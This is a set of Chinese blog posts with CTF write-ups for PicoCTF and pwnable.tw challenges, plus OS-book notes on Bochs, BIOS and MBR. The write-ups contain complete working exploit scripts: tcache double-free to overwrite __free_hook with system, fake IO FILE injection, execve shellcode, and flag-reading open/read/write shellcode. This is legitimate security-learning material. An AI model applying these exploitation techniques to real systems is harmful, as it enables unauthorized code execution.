<h4 id="获得password"><a href="#获得password" class="headerlink" title="获得password"></a>获得password</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26105)</span><br><span class="line">p.recvuntil(&quot;name?&quot;)</span><br><span class="line">p.sendline(&quot;a&quot;*0x100)</span><br><span class="line"># password &#x3D; &quot;a_reAllY_s3cuRe_p4s$word_f85406&quot;</span><br><span class="line"># p.sendline(password)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a_reAllY_s3cuRe_p4s$word_f85406</span><br><span class="line"></span><br><span class="line">Incorrect Password!</span><br></pre></td></tr></table></figure>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26105</span>)</span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">p.sendline(<span class="string">"a"</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># password = "a_reAllY_s3cuRe_p4s$word_f85406"</span></span><br><span class="line"><span class="comment"># p.sendline(password)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="PicoCTF_2018_leak-me">附件</a></p>
]]></content>
  </entry>
  <entry>
    <title>os真象还原-笔记</title>
    <url>/2021/06/06/23-39/</url>
    <content><![CDATA[<h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><h3 id="下载bochs"><a href="#下载bochs" class="headerlink" title="下载bochs"></a>下载bochs</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">下载bochs的2.6.2版本</span></span><br><span class="line">https://sourceforge.net/projects/bochs/files/bochs/2.6.2/bochs-2.6.2.tar.gz/download?use_mirror=jaist&amp;use_mirror=jaist&amp;r=https%3A%2F%2Fsourceforge.net%2Fprojects%2Fbochs%2Ffiles%2Fbochs%2F2.6.2%2F</span><br><span class="line"><span class="meta">#</span><span class="bash">解压</span></span><br><span class="line">tar -zxvf bochs-2.6.2.tar.gz</span><br><span class="line"><span class="meta">#</span><span class="bash">编译</span></span><br><span class="line">cd bochs-2.6.2/</span><br><span class="line"></span><br><span class="line">./configure \</span><br><span class="line"> --prefix=/home/winter/zhen/bochs \</span><br><span class="line"> --enable-debugger \</span><br><span class="line"> --enable-disasm \</span><br><span class="line"> --enable-iodebug \</span><br><span class="line"> --enable-x86-debugger \</span><br><span class="line"> --with-x \</span><br><span class="line"> --with-x11</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">替换 Makefile 92行为如下语句</span></span><br><span class="line">LIBS =  -lm -lgtk-x11-2.0 -lgdk-x11-2.0 -lpangocairo-1.0 -latk-1.0 -lcairo -lgdk_pixbuf-2.0 -lgio-2.0 -lpangoft2-1.0 -lpango-1.0 -lgobject-2.0 -lglib-2.0 -lfontconfig -lfreetype -lfontconfig -lgobject-2.0 -lgmodule-2.0 -lglib-2.0 -lpthread</span><br><span class="line"></span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><h4 id="概念性"><a href="#概念性" class="headerlink" title="概念性"></a>概念性</h4><ol>
<li><p>CPU的硬件电路被设计成只能<strong>运行处于内存</strong>中的程序。</p>
</li>
<li><p>动态：存储介质由于本身电气元件的性质，需要动态刷新【补充电】</p>
</li>
<li><p>CPU可访问的地址 != 物理内存</p>
<p>CPU提交地址 =&gt; 根据地址范围，地址被映射到不同存储设备 =&gt; ROM、显存、内存条等</p>
</li>
<li><p>魔数：没有明确定义的数</p>
</li>
<li><p>$：表示当前行</p>
</li>
<li><p>$$：表示本section的地址</p>
</li>
<li><p>bin文件：纯二进制</p>
</li>
</ol>
<h4 id="BIOS"><a href="#BIOS" class="headerlink" title="BIOS"></a>BIOS</h4><p>全称：Base Input &amp; Output System【基本输入输出系统】</p>
<p>主要工作：检测、初始化硬件和建立<strong>中断向量表</strong>，</p>
<ul>
<li><p>是计算机第一个运行的程序</p>
</li>
<li><p>由硬件加载</p>
</li>
<li><p>BIOS被加载到ROM低端1MB【0xf0000 ~ 0xfffff】</p>
</li>
<li><p>BIOS入口地址：0xffff0【开机时，cs:ip寄存器被强制初始化为0xf000:0xfff0】</p>
<p>入口地址的指令：jmp far f000:e05b【BIOS代码真正开始的地方】</p>
</li>
</ul>
<h4 id="磁盘扇区表示法"><a href="#磁盘扇区表示法" class="headerlink" title="磁盘扇区表示法"></a>磁盘扇区表示法</h4><h5 id="CHS方法"><a href="#CHS方法" class="headerlink" title="CHS方法"></a>CHS方法</h5><ul>
<li>柱面（Cylinder）：所有盘面上，编号相同的磁道集合</li>
<li>磁头（Header）：一张盘有上下两个盘面，一个盘面对应一个磁头 =&gt; 使用磁头表示盘面</li>
<li>扇区（Sector）：磁道划分的小区间【扇区编号从1开始】</li>
</ul>
<h5 id="LBA方法"><a href="#LBA方法" class="headerlink" title="LBA方法"></a>LBA方法</h5><p>【扇区编号从0开始】</p>
<h4 id="MBR"><a href="#MBR" class="headerlink" title="MBR"></a>MBR</h4><ul>
<li><p>主引导记录</p>
</li>
<li><p>存在0盘0道1扇区【磁盘的第一个扇区】</p>
<ul>
<li>扇区末尾两个字节是0x55和0xaa</li>
<li>物理地址0x7c00【存储于最小内存32KB最后部分，且需保证自身可以运行1KB =&gt; 0x8000 - 0x400 = 0x7c00】</li>
<li>大小：必须为512字节 =&gt; 保证扇区末尾两个字节是0x55和0xaa</li>
</ul>
</li>
</ul>
<h3 id="dd命令"><a href="#dd命令" class="headerlink" title="dd命令"></a>dd命令</h3><p>用于磁盘操作</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dd if=读取文件路径 of=输出文件路径 bs=块大小 count=拷贝的块数 conv=notrunc(文件转换方式:不打断文件)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>book</category>
      </categories>
      <tags>
        <tag>《操作系统真相还原》</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw(9-16题)</title>
    <url>/2021/02/25/18-40/</url>
    <content><![CDATA[<blockquote>
<p>更新中…</p>
</blockquote>
<h2 id="Re-alloc"><a href="#Re-alloc" class="headerlink" title="Re-alloc"></a>Re-alloc</h2><blockquote>
<p>主要学习realloc函数的使用</p>
<p>利用realloc可以实现malloc，edit和free（uaf）</p>
</blockquote>
<h3 id="realloc"><a href="#realloc" class="headerlink" title="realloc"></a>realloc</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">realloc(ptr,size)</span><br><span class="line">1.ptr &#x3D;&#x3D; 0 : malloc(size)</span><br><span class="line">2.ptr !&#x3D; 0 &amp;&amp; size &#x3D;&#x3D; 0 : free(ptr)</span><br><span class="line">3.ptr !&#x3D; 0 &amp;&amp; size &#x3D;&#x3D; old_size : edit(ptr)</span><br><span class="line">4.ptr !&#x3D; 0 &amp;&amp; size &lt; old_size : edit(ptr) and free(remainder)</span><br><span class="line">5.ptr !&#x3D; 0 &amp;&amp; size &gt; old_size : malloc(size);strcpy(new_ptr,ptr);free(ptr);return new_ptr</span><br></pre></td></tr></table></figure>
<h3 id="16进制字符串转数字"><a href="#16进制字符串转数字" class="headerlink" title="16进制字符串转数字"></a>16进制字符串转数字</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int(str_hex,16)</span><br></pre></td></tr></table></figure>
<h2 id="Tcache-Tear"><a href="#Tcache-Tear" class="headerlink" title="Tcache Tear"></a>Tcache Tear</h2><blockquote>
<p>libc是2.27的，存在tcache机制。</p>
<p>除了pie，其他保护都开启了</p>
</blockquote>
<p>本机环境与给定的libc不同，故需要如下语句：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = process([<span class="string">"./tcache_tear"</span>],env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./tw_libc-2.27.so"</span>&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ul>
<li>输入bss变量name</li>
<li>add一个大小小于0xff的chunk，地址保存在ptr中</li>
<li>free(ptr)，至多8次【存在uaf】</li>
<li>打印name</li>
</ul>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aaw</span><span class="params">(len,addr,data)</span>:</span></span><br><span class="line">	malloc(len,<span class="string">'aaaa'</span>)</span><br><span class="line">	free()</span><br><span class="line">	free()</span><br><span class="line">	malloc(len,p64(addr))</span><br><span class="line">	malloc(len,<span class="string">'aaaa'</span>)</span><br><span class="line">	malloc(len,data)</span><br></pre></td></tr></table></figure>
<p>利用任意地址写成功修改name</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process([<span class="string">"./tcache_tear"</span>],env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.27/lib/libc-2.27.so"</span>&#125;)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'/usr/local/glibc-2.27/lib/libc-2.27.so'</span>)</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">sla	= <span class="keyword">lambda</span> delim,data		: p.sendlineafter(delim,data)</span><br><span class="line">cmd	= <span class="keyword">lambda</span> choice			: sla(<span class="string">"Your choice :"</span>,str(choice))</span><br><span class="line">init	= <span class="keyword">lambda</span> name			: sla(<span class="string">"Name:"</span>,name)</span><br><span class="line">malloc	= <span class="keyword">lambda</span> size,data		: (cmd(<span class="number">1</span>),sla(<span class="string">"Size:"</span>,str(size)),sla(<span class="string">"Data:"</span>,data))</span><br><span class="line">free	= <span class="keyword">lambda</span> 			: cmd(<span class="number">2</span>)</span><br><span class="line">info	= <span class="keyword">lambda</span>			: cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aaw</span><span class="params">(len,addr,data)</span>:</span></span><br><span class="line">	malloc(len,<span class="string">'aaaa'</span>)</span><br><span class="line">	free()</span><br><span class="line">	free()</span><br><span class="line">	malloc(len,p64(addr))</span><br><span class="line">	malloc(len,<span class="string">'aaaa'</span>)</span><br><span class="line">	malloc(len,data)</span><br><span class="line"></span><br><span class="line">init(<span class="string">"winter"</span>)</span><br><span class="line">info()</span><br><span class="line">name_bss = <span class="number">0x602060</span></span><br><span class="line">aaw(<span class="number">0x20</span>,name_bss,<span class="string">"admin"</span>)</span><br><span class="line">info()</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/25/18-40/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210220184904076.png" alt="image-20210220184904076"></p>
<h4 id="构造unsortedbin"><a href="#构造unsortedbin" class="headerlink" title="构造unsortedbin"></a>构造unsortedbin</h4><p>因为要检查释放的chunk和nextchunk的标志位是否为1。【标志位是下一个chunk的大小&amp;1】，所以，我们需要构造chunk+两个绕过检验的chunk</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>chunk1（0x501）</th>
</tr>
</thead>
<tbody>
<tr>
<td>chunk2(0x21)</td>
</tr>
<tr>
<td>chunk3(0x21)</td>
</tr>
</tbody>
</table>
</div>
<p>chunk2的1检验chunk1，chunk3的1检验chunk2。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">init(p64(<span class="number">0</span>)+p64(<span class="number">0x501</span>))</span><br><span class="line">aaw(<span class="number">0x50</span>,name_bss+<span class="number">0x500</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>)*<span class="number">2</span>)</span><br><span class="line"><span class="comment">#0x500=&gt;0x490(chunk size)+0x10(chunk head)</span></span><br><span class="line">aaw(<span class="number">0x60</span>,name_bss+<span class="number">0x10</span>,<span class="string">'a'</span>)<span class="comment">#让chunk中有数据，并且，malloc的时候，ptr指向name_bss+0x10</span></span><br><span class="line">free()<span class="comment">#将构造的chunkfree</span></span><br></pre></td></tr></table></figure>
<p>得到到main_arena，计算libc基址【得到的main_arena-本次libc机制得到偏移】</p>
<p><img src="/2021/02/25/18-40/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210220193540189.png" alt="image-20210220193540189"></p>
<h4 id="覆盖free-hook为system"><a href="#覆盖free-hook为system" class="headerlink" title="覆盖free_hook为system"></a>覆盖free_hook为system</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = main_arena - <span class="number">0x3EBCA0</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">print(<span class="string">"free_hook:"</span>+hex(free_hook))</span><br><span class="line"></span><br><span class="line">aaw(<span class="number">0x70</span>,free_hook,p64(system))</span><br></pre></td></tr></table></figure>
<p>最后malloc一个内容为system参数的chunk，free即可getshell</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process([<span class="string">"./tcache_tear"</span>],env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./tw_libc-2.27.so"</span>&#125;)</span><br><span class="line"><span class="comment">#p=remote("chall.pwnable.tw",10207)</span></span><br><span class="line">libc = ELF(<span class="string">'./tw_libc-2.27.so'</span>)</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">sla	= <span class="keyword">lambda</span> delim,data		: p.sendlineafter(delim,data)</span><br><span class="line">cmd	= <span class="keyword">lambda</span> choice			: sla(<span class="string">"Your choice :"</span>,str(choice))</span><br><span class="line">init	= <span class="keyword">lambda</span> name			: sla(<span class="string">"Name:"</span>,name)</span><br><span class="line">malloc	= <span class="keyword">lambda</span> size,data		: (cmd(<span class="number">1</span>),sla(<span class="string">"Size:"</span>,str(size)),sla(<span class="string">"Data:"</span>,data))</span><br><span class="line">free	= <span class="keyword">lambda</span> 			: cmd(<span class="number">2</span>)</span><br><span class="line">info	= <span class="keyword">lambda</span>			: cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aaw</span><span class="params">(len,addr,data)</span>:</span></span><br><span class="line">	malloc(len,<span class="string">'aaaa'</span>)</span><br><span class="line">	free()</span><br><span class="line">	free()</span><br><span class="line">	malloc(len,p64(addr))</span><br><span class="line">	malloc(len,<span class="string">'aaaa'</span>)</span><br><span class="line">	malloc(len,data)</span><br><span class="line"></span><br><span class="line">name_bss = <span class="number">0x00602060</span></span><br><span class="line"></span><br><span class="line">init(p64(<span class="number">0</span>)+p64(<span class="number">0x501</span>))</span><br><span class="line">aaw(<span class="number">0x50</span>,name_bss+<span class="number">0x500</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>)*<span class="number">2</span>)</span><br><span class="line">aaw(<span class="number">0x60</span>,name_bss+<span class="number">0x10</span>,<span class="string">'a'</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">info()</span><br><span class="line">p.recvuntil(<span class="string">"Name :"</span>);p.recv(<span class="number">0x10</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">0x8</span>))</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">libc_base = main_arena - <span class="number">0x3EBCA0</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">print(<span class="string">"free_hook:"</span>+hex(free_hook))</span><br><span class="line"></span><br><span class="line">aaw(<span class="number">0x70</span>,free_hook,p64(system))</span><br><span class="line">malloc(<span class="number">0x40</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>参考：<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/13/tcache/" target="_blank" rel="noopener">和媳妇一起学Pwn 之 Tcache Tear</a>             </p>
<h2 id="seethefile"><a href="#seethefile" class="headerlink" title="seethefile"></a>seethefile</h2><blockquote>
<p>栈溢出+io file的题</p>
</blockquote>
<p><img src="/2021/02/25/18-40/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210225183413269.png" alt="image-20210225183413269"></p>
<p>输入name的时候没有长度限制，栈溢出，而name下面是fp变量，可以覆盖</p>
<h3 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏libc</h3><p>因为可以直接读文件，所以<code>/proc/id(self)/maps</code>可以直接读</p>
<h3 id="伪造IO-FILE结构"><a href="#伪造IO-FILE结构" class="headerlink" title="伪造IO FILE结构"></a>伪造IO FILE结构</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fakeFILE = <span class="number">0x0804B284</span><span class="comment">#伪造的地址</span></span><br><span class="line">name = <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line">name += p32(fakeFILE)<span class="comment">#FILE的地址</span></span><br><span class="line"></span><br><span class="line">FILE = p32(<span class="number">0xffffdfff</span>)<span class="comment">#绕过验证</span></span><br><span class="line">FILE += <span class="string">";/bin/sh"</span><span class="comment">#参数，因为不是地址，故可以前面加;或者||直接填</span></span><br><span class="line">FILE = FILE.ljust(<span class="number">0x94</span>,<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">name += FILE</span><br><span class="line">name += p32(fakeFILE+<span class="number">0x98</span>)</span><br><span class="line">name += p32(system)*<span class="number">3</span><span class="comment">#vtable是个虚标指针，里面一般性是21or23个变量，我们需要改的是第三个，别的填充些正常的地址就好</span></span><br></pre></td></tr></table></figure>
<h3 id="flag获取"><a href="#flag获取" class="headerlink" title="flag获取"></a>flag获取</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd home</span><br><span class="line">cd seethefile</span><br></pre></td></tr></table></figure>
<p>下面有这些文件</p>
<p><img src="/2021/02/25/18-40/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210225185641105.png" alt="image-20210225185641105"></p>
<p>执行get_flag可以获得，查看源码可得需要输入字符串<code>Give me the flag</code></p>
<p><img src="/2021/02/25/18-40/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210225185601647.png" alt="image-20210225185601647"></p>
<p>参考：</p>
<ul>
<li><a href="https://n0va-scy.github.io/2019/07/03/pwnable.tw/" target="_blank" rel="noopener">pwnable.tw系列</a></li>
<li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/04/03/file/" target="_blank" rel="noopener">和媳妇一起学Pwn 之 seethefile</a></li>
</ul>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnable.tw</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw记录(前八题)</title>
    <url>/2021/01/09/16-07/</url>
    <content><![CDATA[<h1 id="pwnable-tw记录（前八题）"><a href="#pwnable-tw记录（前八题）" class="headerlink" title="pwnable.tw记录（前八题）"></a>pwnable.tw记录（前八题）</h1><blockquote>
<p>更新中.jpg</p>
<p><img src="/2021/01/09/16-07/image-20210115105118752.png" alt="image-20210115105118752"></p>
</blockquote>
<h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><blockquote>
<p>栈溢出，ret2shellocde</p>
<p>程序流程：执行一次write函数和一次read函数。</p>
<ul>
<li>第一次栈溢出，劫持程序返回write函数的赋参地址（接下来write会将之前的esp地址输出）</li>
<li>第二次write输出esp地址，read函数布置栈空间，放上shellcode，并通过esp的偏移找到shellcode的地址，放在返回地址上。</li>
</ul>
</blockquote>
<p><img src="/2021/01/09/16-07/20200423213641742.png" alt="20200423213641742"></p>
<p><img src="/2021/01/09/16-07/image-20210104164903387.png" alt="image-20210104164903387"></p>
<p>因为第一次最后面retn的时候pop eip，所以第二次write的时候，esp会在0xffffd10c也就是旧的esp的地方。</p>
<p>第二次read的时候，因为add esp,14h，所以这里的覆盖量还是0x14</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./start'</span></span><br><span class="line"><span class="comment">#p = process(filename)</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b*0x08048060")</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Let's start the CTF:"</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x14</span>+p32(<span class="number">0x08048087</span>)</span><br><span class="line">p.send(payload)<span class="comment">#不是sendline，否则0x0a会覆盖esp地址的低地址</span></span><br><span class="line"></span><br><span class="line">esp = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">"esp:"</span>+hex(esp))</span><br><span class="line">shellcode_addr = esp + <span class="number">0x14</span><span class="comment">#后来的返回地址和之前的esp就差一个0x14，因为最后一个（add esp,14h）</span></span><br><span class="line">log.success(<span class="string">"shellcode_addr:"</span>+hex(shellcode_addr))</span><br><span class="line">shellcode = <span class="string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span><span class="comment">#32位较短的shellcode</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"b"</span>*<span class="number">0x14</span>+p32(shellcode_addr) + shellcode</span><br><span class="line">log.success(<span class="string">"len:"</span>+hex(len(payload)))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>以前写的：<a href="https://blog.csdn.net/qq_43935969/article/details/105717621" target="_blank" rel="noopener">https://blog.csdn.net/qq_43935969/article/details/105717621</a></p>
<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><blockquote>
<p>开启了沙箱，只能执行open、read和write函数</p>
<p>程序流程：输入shellcode，执行shellcode，但shellcode里面只能orw</p>
<p>找orw的shellcode即可。</p>
<p><a href="https://xz.aliyun.com/t/6645?spm=5176.12901015.0.i12901015.5e28525cINEQJh#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/6645?spm=5176.12901015.0.i12901015.5e28525cINEQJh#toc-3</a></p>
</blockquote>
<p>shellcode的编写思路</p>
<ol>
<li><p>打开flag文件（open）</p>
</li>
<li><p>将文件内内容读到（read）指定位置的栈上（其实哪里东西，，，注意不会被覆盖就行）</p>
</li>
<li><p>用write函数读取指定位置的信息即可。</p>
</li>
</ol>
<h3 id="32位函数寄存器"><a href="#32位函数寄存器" class="headerlink" title="32位函数寄存器"></a>32位函数寄存器</h3><ul>
<li>第一个参数：ebx</li>
<li>第二个参数：ecx</li>
<li>第三个参数：edx</li>
</ul>
<h3 id="int-0x80调用表"><a href="#int-0x80调用表" class="headerlink" title="int 0x80调用表"></a>int 0x80调用表</h3><blockquote>
<p>几个常用的，不常用的见<a href="https://blog.csdn.net/xiaominthere/article/details/17287965" target="_blank" rel="noopener">百度</a></p>
</blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th><strong>%eax</strong></th>
<th><strong>Name</strong></th>
<th><strong>Source</strong></th>
<th><strong>%ebx</strong></th>
<th><strong>%ecx</strong></th>
<th><strong>%edx</strong></th>
<th><strong>%esx</strong></th>
<th><strong>%edi</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>sys_exit</td>
<td>kernel/exit.c</td>
<td>int</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>2</td>
<td>sys_fork</td>
<td>arch/i386/kernel/process.c</td>
<td><a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#pt_regs" target="_blank" rel="noopener">struct pt_regs</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>3</td>
<td>sys_read</td>
<td>fs/read_write.c</td>
<td>unsigned int</td>
<td>char *</td>
<td><a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#size_t" target="_blank" rel="noopener">size_t</a></td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>4</td>
<td>sys_write</td>
<td>fs/read_write.c</td>
<td>unsigned int</td>
<td>const char *</td>
<td><a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#size_t" target="_blank" rel="noopener">size_t</a></td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>5</td>
<td>sys_open</td>
<td>fs/open.c</td>
<td>const char *</td>
<td>int</td>
<td>int</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>6</td>
<td>sys_close</td>
<td>fs/open.c</td>
<td>unsigned int</td>
<td>-</td>
<td>-</td>
<td></td>
</tr>
</tbody>
</table>
</div>
<h3 id="open"><a href="#open" class="headerlink" title="open"></a>open</h3><p>函数原型：<code>int open(const char * pathname, int flags, mode_t mode);</code></p>
<p>flags表示读写权限，0表示只读</p>
<ul>
<li><code>O_RDONLY</code>：以只读方式打开文件。</li>
<li><code>O_WRONLY</code>：以只写方式打开文件。</li>
<li><code>O_RDWR</code>：以可读写方式打开文件。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">int fd = open(<span class="string">"/home/orw/flag"</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#将字符串"/home/orw/flag"放入栈中</span></span><br><span class="line">push <span class="number">0x00006761</span></span><br><span class="line">push <span class="number">0x6c662f77</span></span><br><span class="line">push <span class="number">0x726f2f65</span></span><br><span class="line">push <span class="number">0x6d6f682f</span></span><br><span class="line"></span><br><span class="line">/bin/sh</span><br><span class="line"><span class="number">0x0068732f</span></span><br><span class="line"><span class="number">0x00006873</span></span><br><span class="line"><span class="number">0x6E69622f</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov eax,0x5#open函数调用号</span><br><span class="line">mov ebx,esp#第一个参数为字符串地址，因为字符串在刚刚压栈，就是esp</span><br><span class="line">xor ecx,ecx#第二个参数为0</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/09/16-07/image-20210104213908883.png" alt="image-20210104213908883"></p>
<h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><p>函数原型：<code>ssize_t read(int fd, void *buf, size_t count);</code></p>
<p>fd是文件描述符</p>
<ul>
<li><p>标准输入（standard input）的文件描述符是 0</p>
</li>
<li><p>标准输出（standard output）的文件描述符是 1</p>
</li>
</ul>
<p>所以这里将open函数的返回值作为文件描述符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">read(fd,buf,<span class="number">0x30</span>);//直接用之前的</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ebx,eax#fp的地址，也就是open函数返回地址</span><br><span class="line">mov ecx,esp#读入到栈上，因为后续没有push、pop等操作，所以esp不变</span><br><span class="line">mov edx,0x30#长度</span><br><span class="line">mov eax,0x3#read函数调用号</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
<h3 id="write"><a href="#write" class="headerlink" title="write"></a>write</h3><p>函数原型：<code>ssize_t write(int fd, const void *buf, size_t nbyte);</code></p>
<p>标准输出，故文件描述符为1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write(<span class="number">1</span>,buf,<span class="number">0x30</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ebx,0x1#文件描述符为1</span><br><span class="line">mov eax,0x4#write函数调用号</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
